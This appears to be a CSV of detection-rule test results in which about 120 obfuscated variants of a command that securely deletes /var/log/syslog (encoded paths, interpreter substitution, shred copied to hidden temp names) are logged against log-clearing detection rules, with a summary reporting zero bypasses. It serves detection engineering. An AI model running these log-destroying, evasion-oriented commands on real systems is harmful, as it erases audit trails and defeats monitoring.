ID,Command,Log File,Result,All Detected Rules
242,shred -u /var/log/0x7f000001,Clear_Linux_Logs_checklog_attack242.log,Log Error (Result Not Found),
243,shred -u /var/log/2130706433,Clear_Linux_Logs_checklog_attack243.log,Log Error (Result Not Found),
244,shred -u /var/log/0x7F000001,Clear_Linux_Logs_checklog_attack244.log,Log Error (Result Not Found),
245,shred -u /var/log/3232235521,Clear_Linux_Logs_checklog_attack245.log,Log Error (Result Not Found),
246,shred -u /var/log/0xC0A80001,Clear_Linux_Logs_checklog_attack246.log,Log Error (Result Not Found),
247,shred -u /var/log/030052000001,Clear_Linux_Logs_checklog_attack247.log,Log Error (Result Not Found),
248,shred -u /var/log/0b01111111000000000000000000000001,Clear_Linux_Logs_checklog_attack248.log,Log Error (Result Not Found),
249,shred -u /var/log/0x00007F000001,Clear_Linux_Logs_checklog_attack249.log,Log Error (Result Not Found),
250,shred -u /var/log/\x2f\x76\x61\x72\x2f\x6c\x6f\x67\x2f\x73\x79\x73\x6c\x6f\x67,Clear_Linux_Logs_checklog_attack250.log,Log Error (Result Not Found),
251,shred -u /var/log/$((2130706433)),Clear_Linux_Logs_checklog_attack251.log,Log Error (Result Not Found),
252,shred -u /var/log/$'\x2fvar\x2flog\x2fsyslog',Clear_Linux_Logs_checklog_attack252.log,Log Error (Result Not Found),
253,"shred -u /var/log/`echo -e ""\057\166\141\162\057\154\157\147\057\163\171\163\154\157\147""",Clear_Linux_Logs_checklog_attack253.log,Log Error (Result Not Found),
254,shred -u /var/log/$(printf '%s' '/var/log/syslog'),Clear_Linux_Logs_checklog_attack254.log,Log Error (Result Not Found),
255,shred -u $(echo '/var/log/syslog'),Clear_Linux_Logs_checklog_attack255.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
256,shred -u $(echo -n '/var/log/syslog'),Clear_Linux_Logs_checklog_attack256.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
257,"shred -u ""$(cat <<< '/var/log/syslog')""",Clear_Linux_Logs_checklog_attack257.log,Log Error (Result Not Found),
258,shred -u $(echo '/var'/'log'/'syslog'),Clear_Linux_Logs_checklog_attack258.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
259,shred -u $(tr -d '\n' <<< '/var/log/syslog'),Clear_Linux_Logs_checklog_attack259.log,Log Error (Result Not Found),
260,shred -u $(eval echo /var/log/syslog),Clear_Linux_Logs_checklog_attack260.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
261,"shred -u ""$(printf '/%s/%s/%s' var log syslog)""",Clear_Linux_Logs_checklog_attack261.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
262,shred -u $(echo /var/log/$(basename /var/log/syslog)),Clear_Linux_Logs_checklog_attack262.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
263,"shred -u $(cut -d "":"" -f2 <<< ""target:/var/log/syslog"")",Clear_Linux_Logs_checklog_attack263.log,Log Error (Result Not Found),
264,"shred -u $(sed 's/^.*://' <<< ""logpath:/var/log/syslog"")",Clear_Linux_Logs_checklog_attack264.log,Log Error (Result Not Found),
265,"shred -u $(awk -F: '{print $2}' <<< ""log:/var/log/syslog"")",Clear_Linux_Logs_checklog_attack265.log,Log Error (Result Not Found),
266,shred -u $(readlink -f /var/../var/log/syslog),Clear_Linux_Logs_checklog_attack266.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
267,"shred -u $(python3 -c ""print('/var/log/' + 'syslog')"")",Clear_Linux_Logs_checklog_attack267.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
268,"shred -u $(perl -e ""print '/var/log/syslog'"")",Clear_Linux_Logs_checklog_attack268.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
269,"shred -u $(node -e ""console.log('/var/log/syslog')"")",Clear_Linux_Logs_checklog_attack269.log,Log Error (Result Not Found),
270,shred -u $(echo c3hyZWQgLXUgL3Zhci9sb2cvc3lzbG9n | base64 -d | cut -d ' ' -f3),Clear_Linux_Logs_checklog_attack270.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Decode Base64 Encoded Text | Clear Linux Logs
271,shred -u $'\x2fvar\x2flog\x2fsyslog',Clear_Linux_Logs_checklog_attack271.log,Log Error (Result Not Found),
272,shred -u $(printf '\x2fvar\x2flog\x2fsyslog'),Clear_Linux_Logs_checklog_attack272.log,Log Error (Result Not Found),
273,shred -u $(echo -e '\057\166\141\162\057\154\157\147\057\163\171\163\154\157\147'),Clear_Linux_Logs_checklog_attack273.log,Log Error (Result Not Found),
274,shred -u $(printf '\057\166\141\162\057\154\157\147\057\163\171\163\154\157\147'),Clear_Linux_Logs_checklog_attack274.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
275,shred -u $(echo $'\057\166\141\162\057\154\157\147\057\163\171\163\154\157\147'),Clear_Linux_Logs_checklog_attack275.log,Log Error (Result Not Found),
276,"shred -u $(awk 'BEGIN{printf ""/var/log/syslog""}')",Clear_Linux_Logs_checklog_attack276.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
277,"shred -u $(perl -e 'print ""/var/log/syslog""')",Clear_Linux_Logs_checklog_attack277.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
278,"shred -u $(python3 - <<<'print(""/var/log/syslog"")')",Clear_Linux_Logs_checklog_attack278.log,Log Error (Result Not Found),
279,"shred -u $(ruby -e 'print ""/var/log/syslog""')",Clear_Linux_Logs_checklog_attack279.log,Log Error (Result Not Found),
280,"shred -u $(php -r 'echo ""/var/log/syslog"";')",Clear_Linux_Logs_checklog_attack280.log,Log Error (Result Not Found),
281,"shred -u $(node -e 'process.stdout.write(""/var/log/syslog"")')",Clear_Linux_Logs_checklog_attack281.log,Log Error (Result Not Found),
282,shred -u $(printf '/%s/%s/%s' var log syslog),Clear_Linux_Logs_checklog_attack282.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
283,shred -u $(echo /var/log/{syslog}),Clear_Linux_Logs_checklog_attack283.log,Log Error (Result Not Found),
284,shred -u $(echo /va*r/lo*g/syslo*g),Clear_Linux_Logs_checklog_attack284.log,Log Error (Result Not Found),
285,shred -u $(sed 's/_/\//g' <<< '_var_log_syslog'),Clear_Linux_Logs_checklog_attack285.log,Log Error (Result Not Found),
286,shred -u $(tr '_' '/' <<< '_var_log_syslog'),Clear_Linux_Logs_checklog_attack286.log,Log Error (Result Not Found),
287,"shred -u $(cut -d, -f2 <<< 'x,/var/log/syslog')",Clear_Linux_Logs_checklog_attack287.log,Log Error (Result Not Found),
288,shred -u $(rev <<< 'golsys/gol/rav/' | rev),Clear_Linux_Logs_checklog_attack288.log,Log Error (Result Not Found),
289,shred -u $(echo 2f7661722f6c6f672f7379736c6f67 | xxd -r -p),Clear_Linux_Logs_checklog_attack289.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
290,shred -u $(echo L3Zhci9sb2cvc3lzbG9n | base64 -d),Clear_Linux_Logs_checklog_attack290.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Decode Base64 Encoded Text | Clear Linux Logs
291,shred -u $(printf '%b' '\x2f\x76\x61\x72\x2f\x6c\x6f\x67\x2f\x73\x79\x73\x6c\x6f\x67'),Clear_Linux_Logs_checklog_attack291.log,Log Error (Result Not Found),
292,shred -u $(echo $((0x2f766172)) | sed 's/.*/\/var\/log\/syslog/'),Clear_Linux_Logs_checklog_attack292.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
293,shred -u $(printf '/var/%s/%s' log syslog),Clear_Linux_Logs_checklog_attack293.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
294,shred -u $(echo /var/log/syslog | iconv -f utf-8 -t utf-8),Clear_Linux_Logs_checklog_attack294.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
295,"shred -u $(printf '%s' ""$(echo /var/log/syslog)"")",Clear_Linux_Logs_checklog_attack295.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
296,shred -u $(sed -n '1p' <<< '/var/log/syslog'),Clear_Linux_Logs_checklog_attack296.log,Log Error (Result Not Found),
297,shred -u $(head -n1 <<< '/var/log/syslog'),Clear_Linux_Logs_checklog_attack297.log,Log Error (Result Not Found),
298,shred -u $(tail -n1 <<< '/var/log/syslog'),Clear_Linux_Logs_checklog_attack298.log,Log Error (Result Not Found),
299,shred -u $(echo /var/log/syslog | awk '{print}'),Clear_Linux_Logs_checklog_attack299.log,Trigger: Clear Linux Logs,File Deletion | Syslog Clearing or Removal Via System Utilities | Clear Linux Logs
300,shred -u $(printf '/%c%c%c/%c%c%c/%c%c%c%c%c%c%c' 118 97 114 108 111 103 115 121 115 108 111 103),Clear_Linux_Logs_checklog_attack300.log,Log Error (Result Not Found),
301,cp /usr/bin/shred /tmp/x; /tmp/x -u /var/log/syslog,Clear_Linux_Logs_checklog_attack301.log,Log Error (Result Not Found),
302,cp $(which shred) /tmp/del; /tmp/del -u /var/log/syslog,Clear_Linux_Logs_checklog_attack302.log,Log Error (Result Not Found),
303,install /usr/bin/shred /tmp/a; /tmp/a -u /var/log/syslog,Clear_Linux_Logs_checklog_attack303.log,Log Error (Result Not Found),
304,cp /bin/shred /dev/shm/s; /dev/shm/s -u /var/log/syslog,Clear_Linux_Logs_checklog_attack304.log,Log Error (Result Not Found),
305,ln /usr/bin/shred /tmp/logclear; /tmp/logclear -u /var/log/syslog,Clear_Linux_Logs_checklog_attack305.log,Log Error (Result Not Found),
306,cp /usr/bin/shred ./s1; ./s1 -u /var/log/syslog,Clear_Linux_Logs_checklog_attack306.log,Log Error (Result Not Found),
307,cp $(command -v shred) /tmp/rmsh; /tmp/rmsh -u /var/log/syslog,Clear_Linux_Logs_checklog_attack307.log,Log Error (Result Not Found),
308,cp /usr/bin/shred /tmp/.log; /tmp/.log -u /var/log/syslog,Clear_Linux_Logs_checklog_attack308.log,Log Error (Result Not Found),
309,cp /usr/bin/shred /tmp/syslogdel; /tmp/syslogdel -u /var/log/syslog,Clear_Linux_Logs_checklog_attack309.log,Log Error (Result Not Found),
310,cp /usr/bin/shred /tmp/.xlog; /tmp/.xlog -u /var/log/syslog,Clear_Linux_Logs_checklog_attack310.log,Log Error (Result Not Found),
311,cp /usr/bin/shred /dev/shm/x; /dev/shm/x -u /var/log/syslog,Clear_Linux_Logs_checklog_attack311.log,Log Error (Result Not Found),
312,cp /usr/bin/shred /var/tmp/rmlog; /var/tmp/rmlog -u /var/log/syslog,Clear_Linux_Logs_checklog_attack312.log,Log Error (Result Not Found),
313,install -m 755 /usr/bin/shred /tmp/y; /tmp/y -u /var/log/syslog,Clear_Linux_Logs_checklog_attack313.log,Log Error (Result Not Found),
314,cp /usr/bin/shred /tmp/lc; nohup /tmp/lc -u /var/log/syslog &,Clear_Linux_Logs_checklog_attack314.log,Log Error (Result Not Found),
315,cp /usr/bin/shred /tmp/a.out; /tmp/a.out -u /var/log/syslog,Clear_Linux_Logs_checklog_attack315.log,Log Error (Result Not Found),
316,cp /usr/bin/shred ~/sdel; ~/sdel -u /var/log/syslog,Clear_Linux_Logs_checklog_attack316.log,Log Error (Result Not Found),
317,cp /usr/bin/shred /tmp/.temp; /tmp/.temp -u /var/log/syslog,Clear_Linux_Logs_checklog_attack317.log,Log Error (Result Not Found),
318,cp /usr/bin/shred /run/shm/sh; /run/shm/sh -u /var/log/syslog,Clear_Linux_Logs_checklog_attack318.log,Log Error (Result Not Found),
319,cp /usr/bin/shred /tmp/cleaner; /tmp/cleaner -u /var/log/syslog,Clear_Linux_Logs_checklog_attack319.log,Log Error (Result Not Found),
320,cp /usr/bin/shred /tmp/xx; /tmp/xx -u /var/log/syslog,Clear_Linux_Logs_checklog_attack320.log,Log Error (Result Not Found),
321,cp /usr/bin/shred /tmp/shred99; /tmp/shred99 -u /var/log/syslog,Clear_Linux_Logs_checklog_attack321.log,Log Error (Result Not Found),
322,cp /usr/bin/shred /tmp/.h; /tmp/.h -u /var/log/syslog,Clear_Linux_Logs_checklog_attack322.log,Log Error (Result Not Found),
323,cp /usr/bin/shred /tmp/syswipe; /tmp/syswipe -u /var/log/syslog,Clear_Linux_Logs_checklog_attack323.log,Log Error (Result Not Found),
324,cp /usr/bin/shred /tmp/clr; /tmp/clr -u /var/log/syslog,Clear_Linux_Logs_checklog_attack324.log,Log Error (Result Not Found),
325,cp /usr/bin/shred /tmp/zlog; /tmp/zlog -u /var/log/syslog,Clear_Linux_Logs_checklog_attack325.log,Log Error (Result Not Found),
326,cp /usr/bin/shred /tmp/tmpx; /tmp/tmpx -u /var/log/syslog,Clear_Linux_Logs_checklog_attack326.log,Log Error (Result Not Found),
327,cp /usr/bin/shred /var/tmp/.x; /var/tmp/.x -u /var/log/syslog,Clear_Linux_Logs_checklog_attack327.log,Log Error (Result Not Found),
328,cp /usr/bin/shred /tmp/final; /tmp/final -u /var/log/syslog,Clear_Linux_Logs_checklog_attack328.log,Log Error (Result Not Found),
329,cp /usr/bin/shred /tmp/.null; /tmp/.null -u /var/log/syslog,Clear_Linux_Logs_checklog_attack329.log,Log Error (Result Not Found),
330,cp /usr/bin/shred /tmp/logwipe; /tmp/logwipe -u /var/log/syslog,Clear_Linux_Logs_checklog_attack330.log,Log Error (Result Not Found),
331,cp /usr/bin/shred /tmp/.cache; /tmp/.cache -u /var/log/syslog,Clear_Linux_Logs_checklog_attack331.log,Log Error (Result Not Found),
332,cp /usr/bin/shred /tmp/rmd; /tmp/rmd -u /var/log/syslog,Clear_Linux_Logs_checklog_attack332.log,Log Error (Result Not Found),
333,cp /usr/bin/shred /tmp/logclean; /tmp/logclean -u /var/log/syslog,Clear_Linux_Logs_checklog_attack333.log,Log Error (Result Not Found),
334,cp /usr/bin/shred /tmp/sh0; /tmp/sh0 -u /var/log/syslog,Clear_Linux_Logs_checklog_attack334.log,Log Error (Result Not Found),
335,cp /usr/bin/shred /tmp/sysdel; /tmp/sysdel -u /var/log/syslog,Clear_Linux_Logs_checklog_attack335.log,Log Error (Result Not Found),
336,cp /usr/bin/shred /tmp/binlog; /tmp/binlog -u /var/log/syslog,Clear_Linux_Logs_checklog_attack336.log,Log Error (Result Not Found),
337,cp /usr/bin/shred /tmp/xbin; /tmp/xbin -u /var/log/syslog,Clear_Linux_Logs_checklog_attack337.log,Log Error (Result Not Found),
338,cp /usr/bin/shred /tmp/zrm; /tmp/zrm -u /var/log/syslog,Clear_Linux_Logs_checklog_attack338.log,Log Error (Result Not Found),
339,cp /usr/bin/shred /tmp/destroy; /tmp/destroy -u /var/log/syslog,Clear_Linux_Logs_checklog_attack339.log,Log Error (Result Not Found),
340,cp /usr/bin/shred /tmp/trash; /tmp/trash -u /var/log/syslog,Clear_Linux_Logs_checklog_attack340.log,Log Error (Result Not Found),
341,cp /usr/bin/shred /tmp/lzap; /tmp/lzap -u /var/log/syslog,Clear_Linux_Logs_checklog_attack341.log,Log Error (Result Not Found),
342,cp /usr/bin/shred /tmp/.sys; /tmp/.sys -u /var/log/syslog,Clear_Linux_Logs_checklog_attack342.log,Log Error (Result Not Found),
343,cp /usr/bin/shred /tmp/tmpclear; /tmp/tmpclear -u /var/log/syslog,Clear_Linux_Logs_checklog_attack343.log,Log Error (Result Not Found),
344,cp /usr/bin/shred /tmp/.wipe; /tmp/.wipe -u /var/log/syslog,Clear_Linux_Logs_checklog_attack344.log,Log Error (Result Not Found),
345,cp /usr/bin/shred /tmp/.rmx; /tmp/.rmx -u /var/log/syslog,Clear_Linux_Logs_checklog_attack345.log,Log Error (Result Not Found),
346,cp /usr/bin/shred /tmp/r; /tmp/r -u /var/log/syslog,Clear_Linux_Logs_checklog_attack346.log,Log Error (Result Not Found),
347,cp /usr/bin/shred /tmp/_s; /tmp/_s -u /var/log/syslog,Clear_Linux_Logs_checklog_attack347.log,Log Error (Result Not Found),
348,cp /usr/bin/shred /tmp/klog; /tmp/klog -u /var/log/syslog,Clear_Linux_Logs_checklog_attack348.log,Log Error (Result Not Found),
349,cp /usr/bin/shred /tmp/.hidden; /tmp/.hidden -u /var/log/syslog,Clear_Linux_Logs_checklog_attack349.log,Log Error (Result Not Found),
350,cp /usr/bin/shred /tmp/bkdel; /tmp/bkdel -u /var/log/syslog,Clear_Linux_Logs_checklog_attack350.log,Log Error (Result Not Found),
351,cp /usr/bin/shred /tmp/killog; /tmp/killog -u /var/log/syslog,Clear_Linux_Logs_checklog_attack351.log,Log Error (Result Not Found),
352,cp /usr/bin/shred /tmp/zclear; /tmp/zclear -u /var/log/syslog,Clear_Linux_Logs_checklog_attack352.log,Log Error (Result Not Found),
353,cp /usr/bin/shred /tmp/hide; /tmp/hide -u /var/log/syslog,Clear_Linux_Logs_checklog_attack353.log,Log Error (Result Not Found),
354,cp /usr/bin/shred /tmp/cleanse; /tmp/cleanse -u /var/log/syslog,Clear_Linux_Logs_checklog_attack354.log,Log Error (Result Not Found),
355,cp /usr/bin/shred /tmp/.clog; /tmp/.clog -u /var/log/syslog,Clear_Linux_Logs_checklog_attack355.log,Log Error (Result Not Found),
356,cp /usr/bin/shred /tmp/shr; /tmp/shr -u /var/log/syslog,Clear_Linux_Logs_checklog_attack356.log,Log Error (Result Not Found),
357,cp /usr/bin/shred /tmp/.zzz; /tmp/.zzz -u /var/log/syslog,Clear_Linux_Logs_checklog_attack357.log,Log Error (Result Not Found),
358,cp /usr/bin/shred /tmp/silent; /tmp/silent -u /var/log/syslog,Clear_Linux_Logs_checklog_attack358.log,Log Error (Result Not Found),
359,cp /usr/bin/shred /tmp/tlog; /tmp/tlog -u /var/log/syslog,Clear_Linux_Logs_checklog_attack359.log,Log Error (Result Not Found),
360,cp /usr/bin/shred /tmp/oblit; /tmp/oblit -u /var/log/syslog,Clear_Linux_Logs_checklog_attack360.log,Log Error (Result Not Found),
,,,,
,,,,
=== SUMMARY REPORT ===,,,,
Calculation Base (Source: All Commands),,,,
Total Meaningful Logs (Denominator),360,,,
Triggered Target (Detections),48,,,
Bypass Logs (Numerator),0,,,
BYPASS RATE (Bypass/Meaningful),0 / 360 (0.00%),,,
,,,,
--- DETAILS (From raw scan) ---,,,,
  > Bypass All (Raw),0,,,
  > Bypass Target Rule (Raw),0,,,
Missing/Not Run,312,,,
